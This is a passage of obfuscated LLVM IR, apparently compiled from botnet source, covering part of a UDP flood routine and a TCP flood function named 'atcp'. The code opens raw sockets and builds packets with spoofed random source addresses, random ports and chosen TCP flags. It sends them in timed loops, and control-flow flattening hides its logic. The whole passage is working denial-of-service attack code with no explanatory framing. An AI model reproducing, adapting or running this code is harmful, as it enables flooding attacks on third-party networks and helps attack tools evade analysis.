  %76 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %75, i32 %76)
  %77 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %78 = load i32, i32* %9, align 4
  %79 = add nsw i32 %77, %78
  store i32 %79, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i32 588263770, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %15, align 4
  %82 = load i8*, i8** %16, align 8
  %83 = load i32, i32* %11, align 4
  %84 = sext i32 %83 to i64
  %85 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %86 = call i64 @sendto(i32 %81, i8* %82, i64 %84, i32 0, %struct.sockaddr* %85, i32 16)
  %87 = load i32, i32* %18, align 4
  %88 = load i32, i32* %14, align 4
  %89 = icmp eq i32 %87, %88
  %90 = select i1 %89, i32 -1448486755, i32 -1317680171
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %8, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 -542825696, i32 45845405
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = call i32 @rand_cmwc()
  %97 = trunc i32 %96 to i16
  %98 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %97, i16* %98, align 2
  store i32 45845405, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %101 = load i32, i32* %17, align 4
  %102 = icmp sgt i32 %100, %101
  %103 = select i1 %102, i32 -523385638, i32 -475686309
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  store i32 1485109911, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  store i32 588263770, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %18, align 4
  %108 = add i32 %107, 1
  store i32 %108, i32* %18, align 4
  store i32 588263770, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 -1411466917, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %111, i32* %19, align 4
  %112 = load i32, i32* %19, align 4
  %113 = icmp ne i32 %112, 0
  %114 = select i1 %113, i32 1817605965, i32 -649924634
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 -1411466917, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %117 = load i32, i32* %19, align 4
  %118 = bitcast i32* %20 to i8*
  %119 = call i32 @setsockopt(i32 %117, i32 0, i32 3, i8* %118, i32 4) #6
  %120 = icmp slt i32 %119, 0
  %121 = select i1 %120, i32 801431863, i32 831791413
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  store i32 -1411466917, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 50, i32* %21, align 4
  store i32 -1671995341, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %21, align 4
  %126 = add nsw i32 %125, -1
  store i32 %126, i32* %21, align 4
  %127 = icmp ne i32 %125, 0
  %128 = select i1 %127, i32 -353541324, i32 -1234766635
  store i32 %128, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %131 = call i32 @rand_cmwc()
  %132 = xor i32 %130, %131
  call void @srand(i32 %132) #6
  %133 = call i32 @rand() #6
  call void @init_rand(i32 %133)
  store i32 -1671995341, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i32, i32* %10, align 4
  %136 = icmp eq i32 %135, 0
  %137 = select i1 %136, i32 1190612504, i32 842094576
  store i32 %137, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 1052368619, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %10, align 4
  %141 = sub nsw i32 32, %140
  %142 = shl i32 1, %141
  %143 = sub nsw i32 %142, 1
  %144 = xor i32 %143, -1
  store i32 %144, i32* %22, align 4
  store i32 1052368619, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %11, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 28, %147
  store i64 %148, i64* %.reg2mem2
  %149 = call i8* @llvm.stacksave()
  store i8* %149, i8** %23, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %150 = alloca i8, i64 %.reload4, align 16
  store i8* %150, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %151 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %151, %struct.iphdr** %24, align 8
  %152 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = getelementptr i8, i8* %153, i64 20
  %155 = bitcast i8* %154 to %struct.udphdr*
  store %struct.udphdr* %155, %struct.udphdr** %25, align 8
  %156 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %158 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %157, i32 0, i32 0
  %159 = load i32, i32* %158, align 4
  %160 = load i32, i32* %22, align 4
  %161 = call i32 @getRandomIP(i32 %160)
  %162 = call i32 @htonl(i32 %161) #9
  %163 = load i32, i32* %11, align 4
  %164 = sext i32 %163 to i64
  %165 = add i64 8, %164
  %166 = trunc i64 %165 to i32
  call void @makeIPPacket(%struct.iphdr* %156, i32 %159, i32 %162, i8 zeroext 17, i32 %166)
  %167 = load i32, i32* %11, align 4
  %168 = sext i32 %167 to i64
  %169 = add i64 8, %168
  %170 = trunc i64 %169 to i16
  %171 = call zeroext i16 @htons(i16 zeroext %170) #9
  %172 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.3* %173 to %struct.anon.4*
  %175 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %174, i32 0, i32 2
  store i16 %171, i16* %175, align 2
  %176 = call i32 @rand_cmwc()
  %177 = trunc i32 %176 to i16
  %178 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.3* %179 to %struct.anon.4*
  %181 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %180, i32 0, i32 0
  store i16 %177, i16* %181, align 2
  %182 = load i32, i32* %8, align 4
  %183 = icmp eq i32 %182, 0
  %184 = select i1 %183, i32 -1182422778, i32 -1796354619
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = call i32 @rand_cmwc()
  store i32 -2087976495, i32* %switchVar
  store i32 %186, i32* %.reg2mem10
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i32, i32* %8, align 4
  %189 = trunc i32 %188 to i16
  %190 = call zeroext i16 @htons(i16 zeroext %189) #9
  %191 = zext i16 %190 to i32
  store i32 -2087976495, i32* %switchVar
  store i32 %191, i32* %.reg2mem10
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %193 = trunc i32 %.reload11 to i16
  %194 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon.3* %195 to %struct.anon.4*
  %197 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %196, i32 0, i32 1
  store i16 %193, i16* %197, align 2
  %198 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %199 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.3* %199 to %struct.anon.4*
  %201 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %200, i32 0, i32 3
  store i16 0, i16* %201, align 2
  %202 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %203 = bitcast %struct.udphdr* %202 to i8*
  %204 = getelementptr inbounds i8, i8* %203, i64 8
  %205 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %204, i32 %205)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %206 = bitcast i8* %.reload8 to i16*
  %207 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 2
  %209 = load i16, i16* %208, align 2
  %210 = zext i16 %209 to i32
  %211 = call zeroext i16 @csum(i16* %206, i32 %210)
  %212 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 7
  store i16 %211, i16* %213, align 2
  %214 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %215 = load i32, i32* %9, align 4
  %216 = add nsw i32 %214, %215
  store i32 %216, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 1948876163, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 2001772720, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %19, align 4
  %220 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %221 = call i64 @sendto(i32 %219, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %220, i32 16)
  %222 = call i32 @rand_cmwc()
  %223 = trunc i32 %222 to i16
  %224 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %225 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %224, i32 0, i32 0
  %226 = bitcast %union.anon.3* %225 to %struct.anon.4*
  %227 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %226, i32 0, i32 0
  store i16 %223, i16* %227, align 2
  %228 = load i32, i32* %8, align 4
  %229 = icmp eq i32 %228, 0
  %230 = select i1 %229, i32 1489412197, i32 -837498977
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32 @rand_cmwc()
  store i32 -720954940, i32* %switchVar
  store i32 %232, i32* %.reg2mem12
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* %8, align 4
  %235 = trunc i32 %234 to i16
  %236 = call zeroext i16 @htons(i16 zeroext %235) #9
  %237 = zext i16 %236 to i32
  store i32 -720954940, i32* %switchVar
  store i32 %237, i32* %.reg2mem12
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %239 = trunc i32 %.reload13 to i16
  %240 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %241 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon.3* %241 to %struct.anon.4*
  %243 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %242, i32 0, i32 1
  store i16 %239, i16* %243, align 2
  %244 = call i32 @rand_cmwc()
  %245 = trunc i32 %244 to i16
  %246 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 3
  store i16 %245, i16* %247, align 4
  %248 = load i32, i32* %22, align 4
  %249 = call i32 @getRandomIP(i32 %248)
  %250 = call i32 @htonl(i32 %249) #9
  %251 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 8
  store i32 %250, i32* %252, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %253 = bitcast i8* %.reload6 to i16*
  %254 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 2
  %256 = load i16, i16* %255, align 2
  %257 = zext i16 %256 to i32
  %258 = call zeroext i16 @csum(i16* %253, i32 %257)
  %259 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 7
  store i16 %258, i16* %260, align 2
  %261 = load i32, i32* %27, align 4
  %262 = load i32, i32* %14, align 4
  %263 = icmp eq i32 %261, %262
  %264 = select i1 %263, i32 -1618826983, i32 -875881487
  store i32 %264, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %267 = load i32, i32* %26, align 4
  %268 = icmp sgt i32 %266, %267
  %269 = select i1 %268, i32 593753592, i32 840364366
  store i32 %269, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  store i32 -812390380, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 1948876163, i32* %switchVar
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %273 = load i32, i32* %27, align 4
  %274 = add i32 %273, 1
  store i32 %274, i32* %27, align 4
  store i32 1948876163, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %276)
  store i32 -1411466917, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %275, %272, %271, %270, %265, %238, %233, %231, %218, %217, %192, %187, %185, %145, %139, %138, %134, %129, %124, %123, %122, %116, %115, %110, %109, %106, %105, %104, %99, %95, %91, %80, %70, %69, %61, %60, %55, %48, %47, %41, %36, %32, %first, %switchDefault
  br label %loopEntry
}

declare i32 @time(...) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @atcp(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1891485450, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1891485450, label %first
    i32 -1595025657, label %31
    i32 -1202076871, label %35
    i32 214646991, label %40
    i32 -1930356375, label %46
    i32 802374218, label %47
    i32 635336671, label %54
    i32 1866456842, label %55
    i32 -803907849, label %61
    i32 -1694322184, label %62
    i32 -381415345, label %66
    i32 1319925651, label %67
    i32 457501577, label %73
    i32 -38270949, label %121
    i32 1560000515, label %157
    i32 1046558847, label %160
    i32 1485431249, label %164
    i32 1617379235, label %169
    i32 -1442262307, label %177
    i32 -1309032331, label %182
    i32 -886287854, label %190
    i32 798095458, label %195
    i32 -1570503240, label %203
    i32 781534717, label %208
    i32 309503539, label %216
    i32 1801344140, label %221
    i32 27617478, label %229
    i32 550224984, label %230
    i32 -1867811009, label %231
    i32 -721643394, label %232
    i32 1697478687, label %233
    i32 -1655989351, label %234
    i32 1596869919, label %236
    i32 -563854873, label %237
    i32 -1937936904, label %255
    i32 398246137, label %257
    i32 486816164, label %262
    i32 -1112051595, label %286
    i32 258199132, label %287
    i32 638985965, label %334
    i32 2044357398, label %339
    i32 -1574162397, label %340
    i32 945936760, label %341
    i32 1237465140, label %344
    i32 -1809774036, label %346
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 -1595025657, i32 -1202076871
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 214646991, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #9
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 214646991, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 -1930356375, i32 802374218
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -1809774036, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 1866456842, i32 635336671
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1809774036, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #6
  %59 = icmp slt i32 %58, 0
  %60 = select i1 %59, i32 -803907849, i32 -1694322184
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1809774036, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  %65 = select i1 %64, i32 -381415345, i32 1319925651
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 0, i32* %19, align 4
  store i32 457501577, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %11, align 4
  %69 = sub nsw i32 32, %68
  %70 = shl i32 1, %69
  %71 = sub nsw i32 %70, 1
  %72 = xor i32 %71, -1
  store i32 %72, i32* %19, align 4
  store i32 457501577, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %13, align 4
  %75 = sext i32 %74 to i64
  %76 = add i64 40, %75
  store i64 %76, i64* %.reg2mem2
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %20, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %78 = alloca i8, i64 %.reload4, align 16
  store i8* %78, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %79 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %79, %struct.iphdr** %21, align 8
  %80 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %81 = bitcast %struct.iphdr* %80 to i8*
  %82 = getelementptr i8, i8* %81, i64 20
  %83 = bitcast i8* %82 to %struct.tcphdr*
  store %struct.tcphdr* %83, %struct.tcphdr** %22, align 8
  %84 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %86 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load i32, i32* %19, align 4
  %89 = call i32 @getRandomIP(i32 %88)
  %90 = call i32 @htonl(i32 %89) #9
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = add i64 20, %92
  %94 = trunc i64 %93 to i32
  call void @makeIPPacket(%struct.iphdr* %84, i32 %87, i32 %90, i8 zeroext 6, i32 %94)
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  %97 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon.1* %98 to %struct.anon.2*
  %100 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %99, i32 0, i32 0
  store i16 %96, i16* %100, align 4
  %101 = call i32 @rand_cmwc()
  %102 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %103 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %102, i32 0, i32 0
  %104 = bitcast %union.anon.1* %103 to %struct.anon.2*
  %105 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %104, i32 0, i32 2
  store i32 %101, i32* %105, align 4
  %106 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %107 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %106, i32 0, i32 0
  %108 = bitcast %union.anon.1* %107 to %struct.anon.2*
  %109 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %108, i32 0, i32 3
  store i32 0, i32* %109, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon.1* %111 to %struct.anon.2*
  %113 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -241
  %116 = or i16 %115, 80
  store i16 %116, i16* %113, align 4
  %117 = load i8*, i8** %12, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i32 0, i32 0)) #10
  %119 = icmp ne i32 %118, 0
  %120 = select i1 %119, i32 1560000515, i32 -38270949
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.1* %123 to %struct.anon.2*
  %125 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -513
  %128 = or i16 %127, 512
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon.1* %130 to %struct.anon.2*
  %132 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -1025
  %135 = or i16 %134, 1024
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon.1* %137 to %struct.anon.2*
  %139 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -257
  %142 = or i16 %141, 256
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon.1* %144 to %struct.anon.2*
  %146 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -4097
  %149 = or i16 %148, 4096
  store i16 %149, i16* %146, align 4
  %150 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon.1* %151 to %struct.anon.2*
  %153 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %152, i32 0, i32 4
  %154 = load i16, i16* %153, align 4
  %155 = and i16 %154, -2049
  %156 = or i16 %155, 2048
  store i16 %156, i16* %153, align 4
  store i32 -563854873, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %12, align 8
  %159 = call i8* @strtok(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %159, i8** %23, align 8
  store i32 1046558847, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = load i8*, i8** %23, align 8
  %162 = icmp ne i8* %161, null
  %163 = select i1 %162, i32 1485431249, i32 1596869919
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8*, i8** %23, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i32 0, i32 0)) #10
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 -1442262307, i32 1617379235
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i32 0, i32 0
  %172 = bitcast %union.anon.1* %171 to %struct.anon.2*
  %173 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %172, i32 0, i32 4
  %174 = load i16, i16* %173, align 4
  %175 = and i16 %174, -513
  %176 = or i16 %175, 512
  store i16 %176, i16* %173, align 4
  store i32 -1655989351, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8*, i8** %23, align 8
  %179 = call i32 @strcmp(i8* %178, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i32 0, i32 0)) #10
  %180 = icmp ne i32 %179, 0
  %181 = select i1 %180, i32 -886287854, i32 -1309032331
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %184 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %183, i32 0, i32 0
  %185 = bitcast %union.anon.1* %184 to %struct.anon.2*
  %186 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %185, i32 0, i32 4
  %187 = load i16, i16* %186, align 4
  %188 = and i16 %187, -1025
  %189 = or i16 %188, 1024
  store i16 %189, i16* %186, align 4
  store i32 1697478687, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8*, i8** %23, align 8
  %192 = call i32 @strcmp(i8* %191, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0)) #10
  %193 = icmp ne i32 %192, 0
  %194 = select i1 %193, i32 -1570503240, i32 798095458
  store i32 %194, i32* %switchVar
  br label %loopEnd

